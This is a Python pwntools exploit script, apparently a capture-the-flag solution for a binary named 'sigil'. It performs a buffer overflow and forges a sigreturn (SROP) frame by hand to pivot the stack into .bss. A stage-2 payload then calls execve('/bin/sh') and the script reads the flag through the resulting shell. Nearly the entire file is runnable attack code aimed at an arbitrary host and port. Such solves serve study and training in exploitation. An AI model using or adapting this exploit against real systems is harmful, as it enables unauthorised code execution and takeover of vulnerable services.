#!/usr/bin/env python3
"""sigil - Pwn (Hard): static, non-PIE binary; read(0, buf, 0x400) into a 0x40 buffer.
Classic SROP: rt_sigreturn (syscall 15) restores all registers from a forged frame.
A two-read trick yields rax=15; the forged frame pivots rsp into .bss, where a stage-2
payload feeds the binary's own syscall arg-loader to call execve("/bin/sh", 0, 0).

Usage: python3 sigil.py <host> <port>      (remote)
       python3 sigil.py local [./sigil]    (local binary)

The CSCTF 2026 instance is retired; this PoC documents the exploit path.
Hand-built SROP frame (no pwntools frame helpers), as in the original solve.
"""
import sys
import time
from pwn import *

context.arch = "amd64"

LISTEN = 0x401030      # vulnerable function
SYSCALL = 0x401024     # raw syscall; followed by mov [rbp-8],rax; mov rax,[rbp-8]; pop rbp; ret
ARGLOADER = 0x401014   # mov rax,[rbp-0x18]; mov rdi,[rbp-0x20]; mov rsi,[rbp-0x28]; mov rdx,[rbp-0x30]; syscall
BSS = 0x404000         # RW page (attempts counter)

SYS_read = 0
SYS_execve = 59
SYS_rt_sigreturn = 15

SS_DISABLE = 0x2
CS = 0x33
SS = 0x2b
EFLAGS = 0x202


def rt_sigreturn_frame(*, rax, rdi, rsi, rdx, rbp, rsp, rip):
    """Minimal x86-64 sigcontext/ucontext as consumed by rt_sigreturn."""
    frame = b""
    frame += p64(0)              # uc_flags
    frame += p64(0)              # uc_link
    frame += p64(0)              # uc_stack.ss_sp
    frame += p64(SS_DISABLE)     # uc_stack.ss_flags
    frame += p64(0)              # uc_stack.ss_size
    for _ in range(8):           # r8-r15
        frame += p64(0)
    frame += p64(rdi)
    frame += p64(rsi)
    frame += p64(rbp)
    frame += p64(0)              # rbx
    frame += p64(rdx)
    frame += p64(rax)
    frame += p64(0)              # rcx
    frame += p64(rsp)
    frame += p64(rip)
    frame += p64(EFLAGS)
    frame += p64(CS)
    frame += p64(0)              # gs
    frame += p64(0)              # fs
    frame += p64(SS)
    return frame


def main():
    if len(sys.argv) >= 2 and sys.argv[1] == "local":
        binary = sys.argv[2] if len(sys.argv) > 2 else "./sigil"
        p = process(binary)
    elif len(sys.argv) >= 2:
        host, _, port = sys.argv[1].partition(":")
        p = remote(host, int(port))
    else:
        raise SystemExit(__doc__)

    # --- Stage 1: overflow -> re-enter listen; its return address is the raw syscall.
    # Frame #1 (pre-planted at 0x58): read(0, BSS, 0x400) with rbp/rsp set so the
    # post-read epilogue pivots into the stage-2 payload in .bss.
    frame1 = rt_sigreturn_frame(rax=SYS_read, rdi=0, rsi=BSS, rdx=0x400,
                                rbp=BSS + 0x80, rsp=BSS, rip=SYSCALL)
    payload1 = b"A" * 0x40       # buf
    payload1 += b"B" * 8         # saved rbp (junk)
    payload1 += p64(LISTEN)      # re-enter listen
    payload1 += p64(SYSCALL)     # second listen's return address -> rt_sigreturn
    payload1 += frame1           # consumed by rt_sigreturn
    p.recvuntil(b"speak the sigil: ")
    p.send(payload1)

    # --- Two-read trick: send exactly 15 bytes -> read returns 15 -> rax = 15,
    # then leave; ret triggers rt_sigreturn with the pre-planted frame.
    time.sleep(0.5)
    p.recvuntil(b"speak the sigil: ")
    p.send(b"A" * SYS_rt_sigreturn)

    # --- Stage 2 (at BSS): epilogue pops [BSS] into rbp, rets into the arg loader.
    stage2 = p64(BSS + 0x80)     # 0x000: -> rbp after pop
    stage2 += p64(ARGLOADER)     # 0x008: -> 0x401014
    stage2 += b"\x00" * (0x30 - len(stage2))
    stage2 += b"/bin/sh\x00"     # 0x030: path (0x404030)
    stage2 += b"\x00" * (0x50 - len(stage2))
    stage2 += p64(0)             # 0x050: rdx (envp)
    stage2 += p64(0)             # 0x058: rsi (argv)
    stage2 += p64(BSS + 0x30)    # 0x060: rdi (path)
    stage2 += p64(SYS_execve)    # 0x068: rax
    p.send(stage2)

    time.sleep(0.5)
    p.sendline(b"cat /flag")
    p.interactive()


if __name__ == "__main__":
    main()
